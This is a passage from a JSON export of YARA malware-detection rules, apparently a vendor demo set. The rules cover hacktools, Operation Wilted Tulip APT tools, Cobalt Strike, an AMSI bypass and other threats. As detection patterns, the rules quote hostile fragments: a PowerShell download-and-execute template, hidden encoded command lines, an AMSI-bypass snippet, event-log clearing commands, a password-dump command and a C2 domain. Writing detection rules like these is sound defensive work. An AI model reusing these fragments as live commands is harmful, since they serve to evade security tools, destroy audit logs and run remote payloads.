05:11:41","description":"Detects CactusTorch Hacktool","minimum_yara":"1.7","name":"CACTUSTORCH_RID2A54","reference":"https://github.com/mdsecactivebreach/CACTUSTORCH","required_modules":[],"rule_hash":"be4a3fbf04b523384d73af5a2bab07a7","score":75,"tags":["DEMO","T1085","HKTL"]},{"author":"Florian Roth","content":"rule SUSP_MyWScript_RID2C4D : DEMO EXE FILE MAL SUSP {\n   meta:\n      description = \"Detects files generated with Script2Exe\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research\"\n      date = \"2017-07-27 09:43:21\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, SUSP\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"C:\\\\Projets\\\\vbsedit_source\\\\script2exe\\\\Release\\\\mywscript.pdb\" fullword ascii\n      $s1 = \"mywscript2\" fullword wide\n      $s2 = \"MYWSCRIPT2\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and ( $x1 or 2 of them )\n}","date":"2017-07-27 09:43:21","description":"Detects files generated with Script2Exe","minimum_yara":"1.7","name":"SUSP_MyWScript_RID2C4D","reference":"Internal Research","required_modules":[],"rule_hash":"adab66b1a9b5bd9f71e48373e73d0725","score":60,"tags":["SUSP","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule PowerShell_Emp_Eval_Jul17_A1_RID3141 : DEMO EXE FILE HKTL SCRIPT T1086 {\n   meta:\n      description = \"Detects suspicious sample with PowerShell content \"\n      author = \"Florian Roth\"\n      reference = \"PowerShell Empire Eval\"\n      date = \"2017-07-27 13:14:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, SCRIPT, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"powershell\" wide\n      $s2 = \"pshcmd\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 30KB and all of them )\n}","date":"2017-07-27 13:14:41","description":"Detects suspicious sample with PowerShell content ","minimum_yara":"1.7","name":"PowerShell_Emp_Eval_Jul17_A1_RID3141","reference":"PowerShell Empire Eval","required_modules":[],"rule_hash":"4e7880c7622c27bcf0c5e04619f15879","score":75,"tags":["SCRIPT","DEMO","T1086","FILE","EXE","HKTL"]},{"author":"Florian Roth","content":"rule AllTheThings_RID2BB8 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects AllTheThings_RID2BB8\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/subTee/AllTheThings_RID2BB8\"\n      date = \"2017-07-27 09:18:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\obj\\\\Debug\\\\AllTheThings_RID2BB8.pdb\" fullword ascii\n      $x2 = \"AllTheThings_RID2BB8.exe\" fullword wide\n      $x3 = \"\\\\AllTheThings_RID2BB8.dll\" fullword ascii\n      $x4 = \"Hello From Main...I Don't Do Anything\" fullword wide\n      $x5 = \"I am a basic COM Object\" fullword wide\n      $x6 = \"I shouldn't really execute either.\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 50KB and 1 of them )\n}","date":"2017-07-27 09:18:31","description":"Detects AllTheThings","minimum_yara":"1.7","name":"AllTheThings_RID2BB8","reference":"https://github.com/subTee/AllTheThings","required_modules":[],"rule_hash":"641ea753af7653c454a326ee62e9596b","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule PowerShell_Emp_Eval_Jul17_A2_RID3142 : DEMO EXE FILE HKTL SCRIPT T1086 {\n   meta:\n      description = \"Detects suspicious sample with PowerShell content \"\n      author = \"Florian Roth\"\n      reference = \"PowerShell Empire Eval\"\n      date = \"2017-07-27 13:14:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL, SCRIPT, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\support\\\\Release\\\\ab.pdb\" ascii\n      $s2 = \"powershell.exe\" ascii fullword\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and all of them )\n}","date":"2017-07-27 13:14:51","description":"Detects suspicious sample with PowerShell content ","minimum_yara":"1.7","name":"PowerShell_Emp_Eval_Jul17_A2_RID3142","reference":"PowerShell Empire Eval","required_modules":[],"rule_hash":"4c752c597d8c3a319901aa6ee0735bd3","score":75,"tags":["SCRIPT","DEMO","T1086","FILE","EXE","HKTL"]},{"author":"Florian Roth","content":"rule WiltedTulip_powershell_RID302C : APT DEMO T1086 {\n   meta:\n      description = \"Detects powershell script used in Operation Wilted Tulip\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/tulip\"\n      date = \"2017-07-23 12:28:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"powershell.exe -nop -w hidden -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+\" ascii\n   condition: \n      1 of them\n}","date":"2017-07-23 12:28:31","description":"Detects powershell script used in Operation Wilted Tulip","minimum_yara":"1.7","name":"WiltedTulip_powershell_RID302C","reference":"http://www.clearskysec.com/tulip","required_modules":[],"rule_hash":"b8d51b15ffe31dff178aa64b92012424","score":75,"tags":["APT","DEMO","T1086"]},{"author":"Florian Roth","content":"rule WiltedTulip_Tools_back_RID2FE8 : APT DEMO EXE FILE T1003 {\n   meta:\n      description = \"Detects Chrome password dumper used in Operation Wilted Tulip\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/tulip\"\n      date = \"2017-07-23 12:17:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%s.exe -f \\\"C:\\\\Users\\\\Admin\\\\Google\\\\Chrome\\\\TestProfile\\\" -o \\\"c:\\\\passlist.txt\\\"\" fullword ascii\n      $x2 = \"\\\\ChromePasswordDump\\\\Release\\\\FireMaster.pdb\" fullword ascii\n      $x3 = \"//Dump Chrome Passwords to a Output file \\\"c:\\\\passlist.txt\\\"\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 1 of them )\n}","date":"2017-07-23 12:17:11","description":"Detects Chrome password dumper used in Operation Wilted Tulip","minimum_yara":"1.7","name":"WiltedTulip_Tools_back_RID2FE8","reference":"http://www.clearskysec.com/tulip","required_modules":[],"rule_hash":"88a6cf8324f1203b86aeb85a874056fc","score":75,"tags":["APT","DEMO","EXE","T1003","FILE"]},{"author":"Florian Roth","content":"rule WiltedTulip_Tools_clrlg_RID306B : APT DEMO {\n   meta:\n      description = \"Detects Windows eventlog cleaner used in Operation Wilted Tulip - file clrlg.bat\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/tulip\"\n      date = \"2017-07-23 12:39:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"('wevtutil.exe el') DO (call :do_clear\" fullword ascii\n      $s2 = \"wevtutil.exe cl %1\" fullword ascii\n   condition: \n      filesize < 1KB and 1 of them\n}","date":"2017-07-23 12:39:01","description":"Detects Windows eventlog cleaner used in Operation Wilted Tulip - file clrlg.bat","minimum_yara":"1.7","name":"WiltedTulip_Tools_clrlg_RID306B","reference":"http://www.clearskysec.com/tulip","required_modules":[],"rule_hash":"299110a0dfc05c80ac9cb50a36ef7e4c","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule WiltedTulip_vminst_RID2E88 : APT DEMO EXE FILE T1085 {\n   meta:\n      description = \"Detects malware used in Operation Wilted Tulip\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/tulip\"\n      date = \"2017-07-23 11:18:31\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1085\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\C++\\\\Trojan\\\\Target\\\\\" ascii\n      $s1 = \"%s\\\\system32\\\\rundll32.exe\" fullword wide\n      $s2 = \"$C:\\\\Windows\\\\temp\\\\l.tmp\" fullword wide\n      $s3 = \"%s\\\\svchost.exe\" fullword wide\n      $s4 = \"args[10] is %S and command is %S\" fullword ascii\n      $s5 = \"LOGON USER FAILD \" fullword ascii\n      $s6 = \"vminst.tmp\" fullword wide\n      $s7 = \"operator co_await\" fullword ascii\n      $s8 = \"?ReflectiveLoader@@YGKPAX@Z\" fullword ascii\n      $s9 = \"%s -k %s\" fullword wide\n      $s10 = \"ERROR in %S/%d\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 900KB and ( 1 of ( $x* ) or 5 of ( $s* ) )\n}","date":"2017-07-23 11:18:31","description":"Detects malware used in Operation Wilted Tulip","minimum_yara":"1.7","name":"WiltedTulip_vminst_RID2E88","reference":"http://www.clearskysec.com/tulip","required_modules":[],"rule_hash":"2631201625c18900bc1c6ba5f0becd0d","score":75,"tags":["APT","T1085","EXE","DEMO","FILE"]},{"author":"Florian Roth","content":"rule WiltedTulip_Windows_UM_Task_RID31C5 : APT DEMO T1053 T1085 {\n   meta:\n      description = \"Detects a Windows scheduled task as used in Operation Wilted Tulip\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/tulip\"\n      date = \"2017-07-23 13:36:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, T1053, T1085\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $r1 = \"<Command>C:\\\\Windows\\\\syswow64\\\\rundll32.exe</Command>\" fullword wide\n      $p1 = \"<Arguments>\\\"C:\\\\Users\\\\public\\\\\" wide\n      $c1 = \"svchost64.swp\\\",checkUpdate\" wide ascii\n      $c2 = \"svchost64.swp,checkUpdate\" wide ascii\n   condition: \n      ( $r1 and $p1 ) or 1 of ( $c* )\n}","date":"2017-07-23 13:36:41","description":"Detects a Windows scheduled task as used in Operation Wilted Tulip","minimum_yara":"1.7","name":"WiltedTulip_Windows_UM_Task_RID31C5","reference":"http://www.clearskysec.com/tulip","required_modules":[],"rule_hash":"8733677d146ca5e1bf6852bbb0d96155","score":75,"tags":["APT","T1085","DEMO","T1053"]},{"author":"Florian Roth","content":"rule WiltedTulip_WindowsTask_RID3065 : APT DEMO {\n   meta:\n      description = \"Detects hack tool used in Operation Wilted Tulip - Windows Tasks\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/tulip\"\n      date = \"2017-07-23 12:38:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"<Command>C:\\\\Windows\\\\svchost.exe</Command>\" fullword wide\n      $x2 = \"<Arguments>-nop -w hidden -encodedcommand\" wide\n      $x3 = \"-encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgA\" \n   condition: \n      1 of them\n}","date":"2017-07-23 12:38:01","description":"Detects hack tool used in Operation Wilted Tulip - Windows Tasks","minimum_yara":"1.7","name":"WiltedTulip_WindowsTask_RID3065","reference":"http://www.clearskysec.com/tulip","required_modules":[],"rule_hash":"e72bad7c35f15d04e31f120ff89b61ea","score":75,"tags":["APT","DEMO"]},{"author":"Florian Roth","content":"rule WiltedTulip_tdtess_RID2E7E : APT DEMO EXE FILE T1035 {\n   meta:\n      description = \"Detects malicious service used in Operation Wilted Tulip\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/tulip\"\n      date = \"2017-07-23 11:16:51\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1035\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"d2lubG9naW4k\" fullword wide\n      $x2 = \"C:\\\\Users\\\\admin\\\\Documents\\\\visual studio 2015\\\\Projects\\\\Export\\\\TDTESS_ShortOne\\\\WinService Template\\\\\" ascii\n      $s1 = \"\\\\WinService Template\\\\obj\\\\x64\\\\x64\\\\winlogin\" ascii\n      $s2 = \"winlogin.exe\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 1 of ( $x* ) or 2 of them ) )\n}","date":"2017-07-23 11:16:51","description":"Detects malicious service used in Operation Wilted Tulip","minimum_yara":"1.7","name":"WiltedTulip_tdtess_RID2E7E","reference":"http://www.clearskysec.com/tulip","required_modules":[],"rule_hash":"c27755eaf3e81b3935cd2b7cb6eefacc","score":75,"tags":["APT","DEMO","EXE","T1035","FILE"]},{"author":"Florian Roth","content":"rule WiltedTulip_SilverlightMSI_RID315D : APT DEMO T1086 {\n   meta:\n      description = \"Detects powershell tool call Get_AD_Users_Logon_History used in Operation Wilted Tulip\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/tulip\"\n      date = \"2017-07-23 13:19:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \".\\\\Get_AD_Users_Logon_History.ps1 -MaxEvent\" fullword ascii\n      $x2 = \"if ((Resolve-dnsname $_.\\\"IP Address\\\" -Type PTR -TcpOnly -DnsOnly -ErrorAction \\\"SilentlyContinue\\\").Type -eq \\\"PTR\\\")\" fullword ascii\n      $x3 = \"$Client_Name = (Resolve-dnsname $_.\\\"IP Address\\\" -Type PTR -TcpOnly -DnsOnly).NameHost  \" fullword ascii\n      $x4 = \"########## Find the Computer account in AD and if not found, throw an exception ###########\" fullword ascii\n   condition: \n      ( filesize < 20KB and 1 of them )\n}","date":"2017-07-23 13:19:21","description":"Detects powershell tool call Get_AD_Users_Logon_History used in Operation Wilted Tulip","minimum_yara":"1.7","name":"WiltedTulip_SilverlightMSI_RID315D","reference":"http://www.clearskysec.com/tulip","required_modules":[],"rule_hash":"5727badf7477a3e4ca17756f51890b65","score":75,"tags":["APT","DEMO","T1086"]},{"author":"Florian Roth","content":"rule WiltedTulip_matryoshka_Injector_RID33C7 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects hack tool used in Operation Wilted Tulip\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/tulip\"\n      date = \"2017-07-23 15:02:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Injector.dll\" fullword ascii\n      $s2 = \"ReflectiveLoader\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them ) or ( pe.exports ( \"__dec\" ) and pe.exports ( \"_check\" ) and pe.exports ( \"_dec\" ) and pe.exports ( \"start\" ) and pe.exports ( \"test\" ) )\n}","date":"2017-07-23 15:02:21","description":"Detects hack tool used in Operation Wilted Tulip","minimum_yara":"1.7","name":"WiltedTulip_matryoshka_Injector_RID33C7","reference":"http://www.clearskysec.com/tulip","required_modules":["pe"],"rule_hash":"506d959ff30835da357a46dc423f5a0b","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule WiltedTulip_Zpp_RID2D21 : APT DEMO EXE FILE {\n   meta:\n      description = \"Detects hack tool used in Operation Wilted Tulip\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/tulip\"\n      date = \"2017-07-23 10:18:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[ERROR] Error Main -i -s -d -gt -lt -mb\" fullword wide\n      $x2 = \"[ERROR] Error Main -i(with.) -s -d -gt -lt -mb -o -e\" fullword wide\n      $s1 = \"LT Time invalid\" fullword wide\n      $s2 = \"doCompressInNetWorkDirectory\" fullword ascii\n      $s3 = \"files remaining ,total file save = \" fullword wide\n      $s4 = \"$ec996350-79a4-477b-87ae-2d5b9dbe20fd\" fullword ascii\n      $s5 = \"Destinition Directory Not Found\" fullword wide\n      $s6 = \"\\\\obj\\\\Release\\\\ZPP.pdb\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 30KB and ( 1 of ( $x* ) or 3 of them )\n}","date":"2017-07-23 10:18:41","description":"Detects hack tool used in Operation Wilted Tulip","minimum_yara":"1.7","name":"WiltedTulip_Zpp_RID2D21","reference":"http://www.clearskysec.com/tulip","required_modules":[],"rule_hash":"b33682b2cd91fee91ea3f27b4181e9bb","score":75,"tags":["APT","DEMO","EXE","FILE"]},{"author":"Florian Roth","content":"rule WiltedTulip_Netsrv_netsrvs_RID31DD : APT DEMO EXE FILE T1085 {\n   meta:\n      description = \"Detects sample from Operation Wilted Tulip\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/tulip\"\n      date = \"2017-07-23 13:40:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1085\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Process %d Created\" fullword ascii\n      $s2 = \"%s\\\\system32\\\\rundll32.exe\" fullword wide\n      $s3 = \"%s\\\\SysWOW64\\\\rundll32.exe\" fullword wide\n      $c1 = \"slbhttps\" fullword ascii\n      $c2 = \"/slbhttps\" fullword wide\n      $c3 = \"/slbdnsk1\" fullword wide\n      $c4 = \"netsrv\" fullword wide\n      $c5 = \"/slbhttps\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( all of ( $s* ) and 1 of ( $c* ) ) )\n}","date":"2017-07-23 13:40:41","description":"Detects sample from Operation Wilted Tulip","minimum_yara":"1.7","name":"WiltedTulip_Netsrv_netsrvs_RID31DD","reference":"http://www.clearskysec.com/tulip","required_modules":[],"rule_hash":"f14e23cde811af2b1894fece8fb82141","score":75,"tags":["APT","T1085","EXE","DEMO","FILE"]},{"author":"Florian Roth","content":"rule CobaltStrike_ReflectiveLoader_RID3297 : APT DEMO EXE FILE T1075 T1105 {\n   meta:\n      description = \"Detects reflective loader (Cobalt Strike)\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/tulip\"\n      date = \"2017-07-23 14:11:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, T1075, T1105\"\n      required_modules = \"pe\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"powershell -nop -exec bypass -EncodedCommand \\\"%s\\\"\" fullword ascii\n      $x2 = \"%d is an x86 process (can't inject x64 content)\" fullword ascii\n      $x3 = \"IEX (New-Object Net.Webclient).DownloadString('http://127.0.0.1:%u/'); %s\" fullword ascii\n      $x4 = \"Failed to impersonate token from %d (%u)\" fullword ascii\n      $x5 = \"Failed to impersonate logged on user %d (%u)\" fullword ascii\n      $x6 = \"%s.4%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%08x%08x%08x%08x%08x%08x%08x.%x%x.%s\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of them ) or ( 2 of them ) or pe.exports ( \"_ReflectiveLoader@4\" )\n}","date":"2017-07-23 14:11:41","description":"Detects reflective loader (Cobalt Strike)","minimum_yara":"1.7","name":"CobaltStrike_ReflectiveLoader_RID3297","reference":"http://www.clearskysec.com/tulip","required_modules":["pe"],"rule_hash":"903b49f48f3839e7e4f4160ec7f6b372","score":75,"tags":["T1075","DEMO","FILE","APT","EXE","T1105"]},{"author":"Florian Roth","content":"rule WiltedTulip_Matryoshka_RAT_RID3150 : APT DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Matryoshka RAT used in Operation Wilted Tulip\"\n      author = \"Florian Roth\"\n      reference = \"http://www.clearskysec.com/tulip\"\n      date = \"2017-07-23 13:17:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"APT, DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"%S:\\\\Users\\\\public\" fullword wide\n      $s2 = \"ntuser.dat.swp\" fullword wide\n      $s3 = \"Job Save / Load Config\" fullword wide\n      $s4 = \".?AVPSCL_CLASS_JOB_SAVE_CONFIG@@\" fullword ascii\n      $s5 = \"winupdate64.com\" fullword ascii\n      $s6 = \"Job Save KeyLogger\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 3 of them )\n}","date":"2017-07-23 13:17:11","description":"Detects Matryoshka RAT used in Operation Wilted Tulip","minimum_yara":"1.7","name":"WiltedTulip_Matryoshka_RAT_RID3150","reference":"http://www.clearskysec.com/tulip","required_modules":[],"rule_hash":"8d4d22d2f1bed7e55d1a8321f7f5605c","score":75,"tags":["APT","DEMO","EXE","FILE","MAL"]},{"author":"Florian Roth","content":"rule Kekeo_Hacktool_RID2C94 : DEMO EXE FILE HKTL {\n   meta:\n      description = \"Detects Kekeo Hacktool\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/gentilkiwi/kekeo/releases\"\n      date = \"2017-07-21 09:55:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"[ticket %u] session Key is NULL, maybe a TGT without enough rights when WCE dumped it.\" fullword wide\n      $x2 = \"ERROR kuhl_m_smb_time ; Invalid! Command: %02x - Status: %08x\" fullword wide\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( 1 of ( $x* ) ) )\n}","date":"2017-07-21 09:55:11","description":"Detects Kekeo Hacktool","minimum_yara":"1.7","name":"Kekeo_Hacktool_RID2C94","reference":"https://github.com/gentilkiwi/kekeo/releases","required_modules":[],"rule_hash":"e20502f7bd7ff67ecd64a55da07a2448","score":75,"tags":["DEMO","EXE","FILE","HKTL"]},{"author":"Florian Roth","content":"rule Exp_EPS_CVE20152545_RID2C5A : DEMO EXPLOIT FILE OFFICE {\n   meta:\n      description = \"Detects EPS Word Exploit\"\n      author = \"Florian Roth\"\n      reference = \"Internal Research - ME\"\n      date = \"2017-07-19 09:45:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXPLOIT, FILE, OFFICE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"word/media/image1.eps\" ascii\n      $s2 = \"-la;7(la+\" ascii\n   condition: \n      uint16 ( 0 ) == 0x4b50 and ( $s1 and #s2 > 20 )\n}","date":"2017-07-19 09:45:31","description":"Detects EPS Word Exploit","minimum_yara":"1.7","name":"Exp_EPS_CVE20152545_RID2C5A","reference":"Internal Research - ME","required_modules":[],"rule_hash":"4fc04b3717ba0119e6272e5d7c77bce9","score":70,"tags":["EXPLOIT","OFFICE","DEMO","FILE"]},{"author":"Florian Roth","content":"rule PS_AMSI_Bypass_RID2C0E : DEMO SCRIPT T1064 T1086 {\n   meta:\n      description = \"Detects PowerShell AMSI Bypass\"\n      author = \"Florian Roth\"\n      reference = \"https://gist.github.com/mattifestation/46d6a2ebb4a1f4f0e7229503dc012ef1\"\n      date = \"2017-07-19 09:32:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      type = \"file\"\n      tags = \"DEMO, SCRIPT, T1064, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static').\" ascii nocase\n   condition: \n      1 of them\n}","date":"2017-07-19 09:32:51","description":"Detects PowerShell AMSI Bypass","minimum_yara":"1.7","name":"PS_AMSI_Bypass_RID2C0E","reference":"https://gist.github.com/mattifestation/46d6a2ebb4a1f4f0e7229503dc012ef1","required_modules":[],"rule_hash":"d95479ddc511fbf2247532be075ec50c","score":70,"tags":["DEMO","T1064","SCRIPT","T1086"]},{"author":"Florian Roth","content":"rule JS_Suspicious_Obfuscation_Dropbox_RID345D : DEMO OBFUS SCRIPT T1027 T1064 T1086 {\n   meta:\n      description = \"Detects PowerShell AMSI Bypass\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/ItsReallyNick/status/887705105239343104\"\n      date = \"2017-07-19 15:27:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, OBFUS, SCRIPT, T1027, T1064, T1086\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"j\\\"+\\\"a\\\"+\\\"v\\\"+\\\"a\\\"+\\\"s\\\"+\\\"c\\\"+\\\"r\\\"+\\\"i\\\"+\\\"p\\\"+\\\"t\\\"\" \n      $x2 = \"script:https://www.dropbox.com\" ascii\n   condition: \n      2 of them\n}","date":"2017-07-19 15:27:21","description":"Detects PowerShell AMSI Bypass","minimum_yara":"1.7","name":"JS_Suspicious_Obfuscation_Dropbox_RID345D","reference":"https://twitter.com/ItsReallyNick/status/887705105239343104","required_modules":[],"rule_hash":"69550be03dd4caa9cade2b6e4a570dec","score":70,"tags":["OBFUS","T1064","SCRIPT","DEMO","T1027","T1086"]},{"author":"Florian Roth","content":"rule JS_Suspicious_MSHTA_Bypass_RID30F1 : DEMO SCRIPT T1064 T1170 {\n   meta:\n      description = \"Detects MSHTA Bypass\"\n      author = \"Florian Roth\"\n      reference = \"https://twitter.com/ItsReallyNick/status/887705105239343104\"\n      date = \"2017-07-19 13:01:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, SCRIPT, T1064, T1170\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"mshtml,RunHTMLApplication\" ascii\n      $s2 = \"new ActiveXObject(\\\"WScript.Shell\\\").Run(\" ascii\n      $s3 = \"/c start mshta j\" ascii nocase\n   condition: \n      2 of them\n}","date":"2017-07-19 13:01:21","description":"Detects MSHTA Bypass","minimum_yara":"1.7","name":"JS_Suspicious_MSHTA_Bypass_RID30F1","reference":"https://twitter.com/ItsReallyNick/status/887705105239343104","required_modules":[],"rule_hash":"781d13a8c9fdb4c1996a825754adff4a","score":70,"tags":["DEMO","T1064","SCRIPT","T1170"]},{"author":"Florian Roth","content":"rule Unspecified_Malware_Jul17_2C_RID316E : DEMO EXE FILE MAL T1047 {\n   meta:\n      description = \"Unspecified Malware - CN relation\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/CX3KaY\"\n      date = \"2017-07-18 13:22:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, EXE, FILE, MAL, T1047\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%AllUsersProfile%\\\\DeviceSync\\\\m.exe\" fullword wide\n      $x2 = \"freenow.chickenkiller.com\" fullword ascii\n      $x3 = \"\\\\Release\\\\PhantomNet-SSL.pdb\" ascii\n      $s1 = \"SELECT * FROM AntiVirusProduct\" fullword ascii\n      $s2 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/%08X-%04X-%04X-%02X%02X%02X%02X\" fullword ascii\n      $s3 = \"Proxy-Authenticate: Basic\" fullword ascii\n      $s4 = \"Proxy-Authenticate: NTLM\" fullword ascii\n      $s5 = \"Root\\\\SecurityCenter2\" fullword wide\n      $s6 = \"aaabbbcccddd\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( 1 of ( $x* ) or 4 of ( $s* ) ) ) or ( all of them )\n}","date":"2017-07-18 13:22:11","description":"Unspecified Malware - CN 